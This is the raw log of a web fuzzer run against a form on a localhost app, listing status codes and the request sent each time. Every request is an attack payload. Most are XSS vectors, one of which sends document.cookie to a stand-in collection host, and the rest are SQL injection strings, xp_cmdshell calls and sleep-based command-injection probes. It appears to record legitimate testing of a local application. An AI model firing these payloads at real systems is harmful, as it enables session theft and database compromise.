Target: http://localhost:8080/owners/new?firstName=FUZZ&lastName=FUZZ&address=FUZZ&city=FUZZ&telephone=FUZZ
Total requests: 468
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00028:  C=400     11 L	     136 W	   2206 Ch	  "\0\0\0 - \0\0\0 - \0\0\0 - \0\0\0 - \0\0\0"
00304:  C=400     11 L	     136 W	   2636 Ch	  "<IMG SRC=javascript:alert('XSS')> - <IMG SRC=javascript:alert('XSS')> - <IMG SRC=javascript:alert('XSS')> - <IMG SRC=javascript:alert('XSS')> - <IMG SRC=javascript:alert('XSS')>"
00303:  C=400     11 L	     136 W	   2716 Ch	  "<IMG SRC="javascript:alert('XSS')" - <IMG SRC="javascript:alert('XSS')" - <IMG SRC="javascript:alert('XSS')" - <IMG SRC="javascript:alert('XSS')" - <IMG SRC="javascript:alert('XSS')""
00302:  C=400     11 L	     136 W	   2766 Ch	  "<IMG SRC="javascript:alert('XSS');"> - <IMG SRC="javascript:alert('XSS');"> - <IMG SRC="javascript:alert('XSS');"> - <IMG SRC="javascript:alert('XSS');"> - <IMG SRC="javascript:alert('XSS');">"
00301:  C=400     11 L	     136 W	   2756 Ch	  "<IMG%20SRC='javascript:alert(document.cookie)'> - <IMG%20SRC='javascript:alert(document.cookie)'> - <IMG%20SRC='javascript:alert(document.cookie)'> - <IMG%20SRC='javascript:alert(document.cookie)'> - <IMG%20SRC='javascript:alert(document.cookie)'>"
00298:  C=400     11 L	     136 W	   2766 Ch	  "&ltscript&gtalert(document.cookie);</script> - &ltscript&gtalert(document.cookie);</script> - &ltscript&gtalert(document.cookie);</script> - &ltscript&gtalert(document.cookie);</script> - &ltscript&gtalert(document.cookie);</script>"
00295:  C=400     11 L	     136 W	   2666 Ch	  "%3cscript%3ealert("XSS");%3c/script%3e - %3cscript%3ealert("XSS");%3c/script%3e - %3cscript%3ealert("XSS");%3c/script%3e - %3cscript%3ealert("XSS");%3c/script%3e - %3cscript%3ealert("XSS");%3c/script%3e"
00310:  C=400     11 L	     136 W	   2756 Ch	  "<IMG%20SRC='javasc	ript:alert(document.cookie)'> - <IMG%20SRC='javasc	ript:alert(document.cookie)'> - <IMG%20SRC='javasc	ript:alert(document.cookie)'> - <IMG%20SRC='javasc	ript:alert(document.cookie)'> - <IMG%20SRC='javasc	ript:alert(document.cookie)'>"
00312:  C=400     11 L	     136 W	   2088 Ch	  "<IMG SRC="jav&#x09;ascript:alert('XSS');"> - <IMG SRC="jav&#x09;ascript:alert('XSS');"> - <IMG SRC="jav&#x09;ascript:alert('XSS');"> - <IMG SRC="jav&#x09;ascript:alert('XSS');"> - <IMG SRC="jav&#x09;ascript:alert('XSS');">"
00316:  C=400     11 L	     136 W	   2786 Ch	  "<IMG DYNSRC="javascript:alert('XSS')"> - <IMG DYNSRC="javascript:alert('XSS')"> - <IMG DYNSRC="javascript:alert('XSS')"> - <IMG DYNSRC="javascript:alert('XSS')"> - <IMG DYNSRC="javascript:alert('XSS')">"
00340:  C=400     11 L	     136 W	   2186 Ch	  "\x27 - \x27 - \x27 - \x27 - \x27"
00299:  C=200    174 L	     307 W	   5129 Ch	  "&ltscript&gtalert(document.cookie);&ltscript&gtalert - &ltscript&gtalert(document.cookie);&ltscript&gtalert - &ltscript&gtalert(document.cookie);&ltscript&gtalert - &ltscript&gtalert(document.cookie);&ltscript&gtalert - &ltscript&gtalert(document.cookie);&ltscript&gtalert"
00297:  C=200    174 L	     307 W	   5129 Ch	  "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E - %3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E - %3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E - %3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E - %3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E"
00357:  C=400     11 L	     136 W	   2082 Ch	  "" or 0=0 # - " or 0=0 # - " or 0=0 # - " or 0=0 # - " or 0=0 #"
00324:  C=200    174 L	     307 W	   5129 Ch	  "%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E - %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E - %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E - %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E - %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E"
00354:  C=400     11 L	     136 W	   2366 Ch	  "" or 0=0 -- - " or 0=0 -- - " or 0=0 -- - " or 0=0 -- - " or 0=0 --"
00350:  C=400     11 L	     136 W	   2496 Ch	  "" or "x"="x - " or "x"="x - " or "x"="x - " or "x"="x - " or "x"="x"
00359:  C=200    174 L	     307 W	   5129 Ch	  "' or 1=1-- - ' or 1=1-- - ' or 1=1-- - ' or 1=1-- - ' or 1=1--"
00347:  C=400     11 L	     136 W	   2436 Ch	  "<>"'%;)(&+ - <>"'%;)(&+ - <>"'%;)(&+ - <>"'%;)(&+ - <>"'%;)(&+"
00351:  C=200    174 L	     307 W	   5129 Ch	  "') or ('x'='x - ') or ('x'='x - ') or ('x'='x - ') or ('x'='x - ') or ('x'='x"
00358:  C=200    174 L	     307 W	   5129 Ch	  "or 0=0 # - or 0=0 # - or 0=0 # - or 0=0 # - or 0=0 #"
00356:  C=200    174 L	     307 W	   5129 Ch	  "' or 0=0 # - ' or 0=0 # - ' or 0=0 # - ' or 0=0 # - ' or 0=0 #"
00355:  C=200    174 L	     307 W	   5129 Ch	  "or 0=0 -- - or 0=0 -- - or 0=0 -- - or 0=0 -- - or 0=0 --"
00353:  C=200    174 L	     307 W	   5129 Ch	  "' or 0=0 -- - ' or 0=0 -- - ' or 0=0 -- - ' or 0=0 -- - ' or 0=0 --"
00352:  C=200    174 L	     307 W	   5129 Ch	  "0 or 1=1 - 0 or 1=1 - 0 or 1=1 - 0 or 1=1 - 0 or 1=1"
00349:  C=200    174 L	     307 W	   5129 Ch	  "' or 'x'='x - ' or 'x'='x - ' or 'x'='x - ' or 'x'='x - ' or 'x'='x"
00344:  C=400     11 L	     136 W	   2396 Ch	  "\x27\x6F\x72 SELECT * - \x27\x6F\x72 SELECT * - \x27\x6F\x72 SELECT * - \x27\x6F\x72 SELECT * - \x27\x6F\x72 SELECT *"
00348:  C=200    174 L	     307 W	   5129 Ch	  "' or ''=' - ' or ''=' - ' or ''=' - ' or ''=' - ' or ''='"
00343:  C=400     11 L	     136 W	   2396 Ch	  "\x27\x4F\x52 SELECT * - \x27\x4F\x52 SELECT * - \x27\x4F\x52 SELECT * - \x27\x4F\x52 SELECT * - \x27\x4F\x52 SELECT *"
00342:  C=400     11 L	     136 W	   2256 Ch	  "\x3D \x27 - \x3D \x27 - \x3D \x27 - \x3D \x27 - \x3D \x27"
00339:  C=400     11 L	     136 W	   2186 Ch	  "\x23 - \x23 - \x23 - \x23 - \x23"
00341:  C=400     11 L	     136 W	   2306 Ch	  "\x3D \x3B' - \x3D \x3B' - \x3D \x3B' - \x3D \x3B' - \x3D \x3B'"
00346:  C=200    174 L	     307 W	   5129 Ch	  "admin'-- - admin'-- - admin'-- - admin'-- - admin'--"
00345:  C=200    174 L	     307 W	   5129 Ch	  "'or select * - 'or select * - 'or select * - 'or select * - 'or select *"
00338:  C=200    174 L	     307 W	   5129 Ch	  "= -- - = -- - = -- - = -- - = --"
00329:  C=400     11 L	     136 W	   2206 Ch	  "" - " - " - " - ""
00337:  C=200    174 L	     307 W	   5129 Ch	  "= ; - = ; - = ; - = ; - = ;"
00336:  C=200    174 L	     307 W	   5129 Ch	  "= ' - = ' - = ' - = ' - = '"
00330:  C=200    174 L	     307 W	   5129 Ch	  "# - # - # - # - #"
00326:  C=400     11 L	     136 W	   2556 Ch	  "'';!--"<XSS>=&{()} - '';!--"<XSS>=&{()} - '';!--"<XSS>=&{()} - '';!--"<XSS>=&{()} - '';!--"<XSS>=&{()}"
00335:  C=200    174 L	     307 W	   5129 Ch	  "' ; - ' ; - ' ; - ' ; - ' ;"
00323:  C=400     11 L	     136 W	   3576 Ch	  ""><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script> - "><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script> - "><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script> - "><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script> - "><script>document.location='http://your.site.com/cgi-bin/cookie.cgi?'+document.cookie</script>"
00325:  C=400     11 L	     136 W	   5296 Ch	  "';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{} - ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{} - ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{} - ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{} - ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}"
00334:  C=200    174 L	     307 W	   5129 Ch	  "--'; - --'; - --'; - --'; - --';"
00327:  C=200    174 L	     307 W	   5129 Ch	  "http://localhost:8080/owners/new?firstName=&lastName=&address=&city=&telephone="
00331:  C=200    174 L	     307 W	   5129 Ch	  "- - - - - - - - -"
00332:  C=200    174 L	     307 W	   5129 Ch	  "-- - -- - -- - -- - --"
00333:  C=200    174 L	     307 W	   5129 Ch	  "' -- - ' -- - ' -- - ' -- - ' --"
00328:  C=200    174 L	     307 W	   5129 Ch	  "' - ' - ' - ' - '"
00321:  C=400     11 L	     136 W	   2070 Ch	  "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> - <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
00320:  C=400     11 L	     136 W	   2070 Ch	  "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> - <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> - <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> - <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> - <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
00319:  C=400     11 L	     136 W	   2070 Ch	  "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> - <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> - <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> - <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> - <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
00322:  C=200    174 L	     307 W	   5129 Ch	  "'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E - '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E - '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E - '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E - '%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E"
00318:  C=400     11 L	     136 W	   3146 Ch	  "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'> - <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'> - <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'> - <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'> - <IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>"
00315:  C=400     11 L	     136 W	   2088 Ch	  "<IMG SRC=" &#14;  javascript:alert('XSS');"> - <IMG SRC=" &#14;  javascript:alert('XSS');"> - <IMG SRC=" &#14;  javascript:alert('XSS');"> - <IMG SRC=" &#14;  javascript:alert('XSS');"> - <IMG SRC=" &#14;  javascript:alert('XSS');">"
00317:  C=400     11 L	     136 W	   2786 Ch	  "<IMG LOWSRC="javascript:alert('XSS')"> - <IMG LOWSRC="javascript:alert('XSS')"> - <IMG LOWSRC="javascript:alert('XSS')"> - <IMG LOWSRC="javascript:alert('XSS')"> - <IMG LOWSRC="javascript:alert('XSS')">"
00314:  C=400     11 L	     136 W	   2088 Ch	  "<IMG SRC="jav&#x0D;ascript:alert('XSS');"> - <IMG SRC="jav&#x0D;ascript:alert('XSS');"> - <IMG SRC="jav&#x0D;ascript:alert('XSS');"> - <IMG SRC="jav&#x0D;ascript:alert('XSS');"> - <IMG SRC="jav&#x0D;ascript:alert('XSS');">"
00311:  C=400     11 L	     136 W	   2766 Ch	  "<IMG SRC="jav	ascript:alert('XSS');"> - <IMG SRC="jav	ascript:alert('XSS');"> - <IMG SRC="jav	ascript:alert('XSS');"> - <IMG SRC="jav	ascript:alert('XSS');"> - <IMG SRC="jav	ascript:alert('XSS');">"
00313:  C=400     11 L	     136 W	   2088 Ch	  "<IMG SRC="jav&#x0A;ascript:alert('XSS');"> - <IMG SRC="jav&#x0A;ascript:alert('XSS');"> - <IMG SRC="jav&#x0A;ascript:alert('XSS');"> - <IMG SRC="jav&#x0A;ascript:alert('XSS');"> - <IMG SRC="jav&#x0A;ascript:alert('XSS');">"
00360:  C=400     11 L	     136 W	   2336 Ch	  "" or 1=1-- - " or 1=1-- - " or 1=1-- - " or 1=1-- - " or 1=1--"
00362:  C=400     11 L	     136 W	   2506 Ch	  ""' or 1 --'" - "' or 1 --'" - "' or 1 --'" - "' or 1 --'" - "' or 1 --'""
00383:  C=200    174 L	     307 W	   5129 Ch	  "select - select - select - select - select"
00382:  C=200    174 L	     307 W	   5129 Ch	  "PRINT @@variable - PRINT @@variable - PRINT @@variable - PRINT @@variable - PRINT @@variable"
00366:  C=200    174 L	     307 W	   5129 Ch	  "' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''=' - ' or 1=1 or ''='"
00386:  C=200    174 L	     307 W	   5129 Ch	  "or - or - or - or - or"
00374:  C=200    174 L	     307 W	   5129 Ch	  "hi' or 1=1 -- - hi' or 1=1 -- - hi' or 1=1 -- - hi' or 1=1 -- - hi' or 1=1 --"
00388:  C=200    174 L	     307 W	   5129 Ch	  "limit - limit - limit - limit - limit"
00387:  C=200    174 L	     307 W	   5129 Ch	  "procedure - procedure - procedure - procedure - procedure"
00385:  C=200    174 L	     307 W	   5129 Ch	  "as - as - as - as - as"
00381:  C=200    174 L	     307 W	   5129 Ch	  "PRINT - PRINT - PRINT - PRINT - PRINT"
00384:  C=200    174 L	     307 W	   5129 Ch	  "insert - insert - insert - insert - insert"
00377:  C=400     11 L	     136 W	   2536 Ch	  "hi") or ("a"="a - hi") or ("a"="a - hi") or ("a"="a - hi") or ("a"="a - hi") or ("a"="a"
00373:  C=400     11 L	     136 W	   2386 Ch	  "hi" or 1=1 -- - hi" or 1=1 -- - hi" or 1=1 -- - hi" or 1=1 -- - hi" or 1=1 --"
00372:  C=400     11 L	     136 W	   2516 Ch	  "hi" or "a"="a - hi" or "a"="a - hi" or "a"="a - hi" or "a"="a - hi" or "a"="a"
00371:  C=400     11 L	     136 W	   2516 Ch	  "") or ("a"="a - ") or ("a"="a - ") or ("a"="a - ") or ("a"="a - ") or ("a"="a"
00380:  C=200    174 L	     307 W	   5129 Ch	  ",@variable - ,@variable - ,@variable - ,@variable - ,@variable"
00379:  C=200    174 L	     307 W	   5129 Ch	  "@variable - @variable - @variable - @variable - @variable"
00369:  C=400     11 L	     136 W	   2496 Ch	  "" or "a"="a - " or "a"="a - " or "a"="a - " or "a"="a - " or "a"="a"
00378:  C=200    174 L	     307 W	   5129 Ch	  "'hi' or 'x'='x'; - 'hi' or 'x'='x'; - 'hi' or 'x'='x'; - 'hi' or 'x'='x'; - 'hi' or 'x'='x';"
00376:  C=200    174 L	     307 W	   5129 Ch	  "hi') or ('a'='a - hi') or ('a'='a - hi') or ('a'='a - hi') or ('a'='a - hi') or ('a'='a"
00375:  C=200    174 L	     307 W	   5129 Ch	  "hi' or 'a'='a - hi' or 'a'='a - hi' or 'a'='a - hi' or 'a'='a - hi' or 'a'='a"
00367:  C=400     11 L	     136 W	   2586 Ch	  "" or 1=1 or ""=" - " or 1=1 or ""=" - " or 1=1 or ""=" - " or 1=1 or ""=" - " or 1=1 or ""=""
00370:  C=200    174 L	     307 W	   5129 Ch	  "') or ('a'='a - ') or ('a'='a - ') or ('a'='a - ') or ('a'='a - ') or ('a'='a"
00368:  C=200    174 L	     307 W	   5129 Ch	  "' or a=a-- - ' or a=a-- - ' or a=a-- - ' or a=a-- - ' or a=a--"
00365:  C=200    174 L	     307 W	   5129 Ch	  "or%201=1 -- - or%201=1 -- - or%201=1 -- - or%201=1 -- - or%201=1 --"
00364:  C=200    174 L	     307 W	   5129 Ch	  "or%201=1 - or%201=1 - or%201=1 - or%201=1 - or%201=1"
00361:  C=200    174 L	     307 W	   5129 Ch	  "' or '1'='1'-- - ' or '1'='1'-- - ' or '1'='1'-- - ' or '1'='1'-- - ' or '1'='1'--"
00363:  C=200    174 L	     307 W	   5129 Ch	  "or 1=1-- - or 1=1-- - or 1=1-- - or 1=1-- - or 1=1--"
00389:  C=200    174 L	     307 W	   5129 Ch	  "order by - order by - order by - order by - order by"
00391:  C=200    174 L	     307 W	   5129 Ch	  "desc - desc - desc - desc - desc"
00395:  C=200    174 L	     307 W	   5129 Ch	  "having - having - having - having - having"
00402:  C=200    174 L	     307 W	   5129 Ch	  "' or uname like '% - ' or uname like '% - ' or uname like '% - ' or uname like '% - ' or uname like '%"
00401:  C=200    174 L	     307 W	   5129 Ch	  "' or username like '% - ' or username like '% - ' or username like '% - ' or username like '% - ' or username like '%"
00400:  C=200    174 L	     307 W	   5129 Ch	  "bfilename - bfilename - bfilename - bfilename - bfilename"
00399:  C=200    174 L	     307 W	   5129 Ch	  "handler - handler - handler - handler - handler"
00398:  C=200    174 L	     307 W	   5129 Ch	  "like - like - like - like - like"
00397:  C=200    174 L	     307 W	   5129 Ch	  "replace - replace - replace - replace - replace"
00396:  C=200    174 L	     307 W	   5129 Ch	  "truncate - truncate - truncate - truncate - truncate"
00394:  C=200    174 L	     307 W	   5129 Ch	  "distinct - distinct - distinct - distinct - distinct"
00393:  C=200    174 L	     307 W	   5129 Ch	  "update - update - update - update - update"
00417:  C=400     11 L	     136 W	   2376 Ch	  "'||UTL_HTTP.REQUEST - '||UTL_HTTP.REQUEST - '||UTL_HTTP.REQUEST - '||UTL_HTTP.REQUEST - '||UTL_HTTP.REQUEST"
00392:  C=200    174 L	     307 W	   5129 Ch	  "delete - delete - delete - delete - delete"
00403:  C=200    174 L	     307 W	   5129 Ch	  "' or userid like '% - ' or userid like '% - ' or userid like '% - ' or userid like '% - ' or userid like '%"
00405:  C=200    174 L	     307 W	   5129 Ch	  "' or user like '% - ' or user like '% - ' or user like '% - ' or user like '% - ' or user like '%"
00390:  C=200    174 L	     307 W	   5129 Ch	  "asc - asc - asc - asc - asc"
00409:  C=200    174 L	     307 W	   5129 Ch	  "'; exec xp_regread - '; exec xp_regread - '; exec xp_regread - '; exec xp_regread - '; exec xp_regread"
00412:  C=400     11 L	     136 W	   2326 Ch	  "\x27UNION SELECT - \x27UNION SELECT - \x27UNION SELECT - \x27UNION SELECT - \x27UNION SELECT"
00416:  C=200    174 L	     307 W	   5129 Ch	  "' (select top 1 - ' (select top 1 - ' (select top 1 - ' (select top 1 - ' (select top 1"
00415:  C=200    174 L	     307 W	   5129 Ch	  "' or (EXISTS) - ' or (EXISTS) - ' or (EXISTS) - ' or (EXISTS) - ' or (EXISTS)"
00414:  C=200    174 L	     307 W	   5129 Ch	  "' UNION ALL SELECT - ' UNION ALL SELECT - ' UNION ALL SELECT - ' UNION ALL SELECT - ' UNION ALL SELECT"
00413:  C=200    174 L	     307 W	   5129 Ch	  "' UNION SELECT - ' UNION SELECT - ' UNION SELECT - ' UNION SELECT - ' UNION SELECT"
00411:  C=200    174 L	     307 W	   5129 Ch	  "--sp_password - --sp_password - --sp_password - --sp_password - --sp_password"
00408:  C=200    174 L	     307 W	   5129 Ch	  "'; exec master..xp_cmdshell - '; exec master..xp_cmdshell - '; exec master..xp_cmdshell - '; exec master..xp_cmdshell - '; exec master..xp_cmdshell"
00410:  C=200    174 L	     307 W	   5129 Ch	  "t'exec master..xp_cmdshell 'nslookup www.google.com'-- - t'exec master..xp_cmdshell 'nslookup www.google.com'-- - t'exec master..xp_cmdshell 'nslookup www.google.com'-- - t'exec master..xp_cmdshell 'nslookup www.google.com'-- - t'exec master..xp_cmdshell 'nslookup www.google.com'--"
00407:  C=200    174 L	     307 W	   5129 Ch	  "exec sp - exec sp - exec sp - exec sp - exec sp"
00404:  C=200    174 L	     307 W	   5129 Ch	  "' or uid like '% - ' or uid like '% - ' or uid like '% - ' or uid like '% - ' or uid like '%"
00406:  C=200    174 L	     307 W	   5129 Ch	  "exec xp - exec xp - exec xp - exec xp - exec xp"
00432:  C=400     11 L	     136 W	   2166 Ch	  "*| - *| - *| - *| - *|"
00430:  C=400     11 L	     136 W	   2156 Ch	  "| - | - | - | - |"
00418:  C=200    174 L	     307 W	   5129 Ch	  "1;SELECT%20* - 1;SELECT%20* - 1;SELECT%20* - 1;SELECT%20* - 1;SELECT%20*"
00420:  C=200    174 L	     307 W	   5129 Ch	  "tz_offset - tz_offset - tz_offset - tz_offset - tz_offset"
00424:  C=200    174 L	     307 W	   5129 Ch	  "%20$(sleep%2050) - %20$(sleep%2050) - %20$(sleep%2050) - %20$(sleep%2050) - %20$(sleep%2050)"
00431:  C=200    174 L	     307 W	   5129 Ch	  "%7C - %7C - %7C - %7C - %7C"
00429:  C=200    174 L	     307 W	   5129 Ch	  "(sqlattempt2) - (sqlattempt2) - (sqlattempt2) - (sqlattempt2) - (sqlattempt2)"
00428:  C=200    174 L	     307 W	   5129 Ch	  "'sqlattempt1 - 'sqlattempt1 - 'sqlattempt1 - 'sqlattempt1 - 'sqlattempt1"
00426:  C=200    174 L	     307 W	   5129 Ch	  "char%4039%41%2b%40SELECT - char%4039%41%2b%40SELECT - char%4039%41%2b%40SELECT - char%4039%41%2b%40SELECT - char%4039%41%2b%40SELECT"
00427:  C=200    174 L	     307 W	   5129 Ch	  "&apos;%20OR - &apos;%20OR - &apos;%20OR - &apos;%20OR - &apos;%20OR"
00423:  C=200    174 L	     307 W	   5129 Ch	  "%27%20or%201=1 - %27%20or%201=1 - %27%20or%201=1 - %27%20or%201=1 - %27%20or%201=1"
00425:  C=200    174 L	     307 W	   5129 Ch	  "%20'sleep%2050' - %20'sleep%2050' - %20'sleep%2050' - %20'sleep%2050' - %20'sleep%2050'"
00422:  C=200    174 L	     307 W	   5129 Ch	  "'%20or%201=1 - '%20or%201=1 - '%20or%201=1 - '%20or%201=1 - '%20or%201=1"
00419:  C=200    174 L	     307 W	   5129 Ch	  "to_timestamp_tz - to_timestamp_tz - to_timestamp_tz - to_timestamp_tz - to_timestamp_tz"
00421:  C=200    174 L	     307 W	   5129 Ch	  "&lt;&gt;&quot;'%;)(&amp;+ - &lt;&gt;&quot;'%;)(&amp;+ - &lt;&gt;&quot;'%;)(&amp;+ - &lt;&gt;&quot;'%;)(&amp;+ - &lt;&gt;&quot;'%;)(&amp;+"
00433:  C=200    174 L	     307 W	   5129 Ch	  "%2A%7C - %2A%7C - %2A%7C - %2A%7C - %2A%7C"
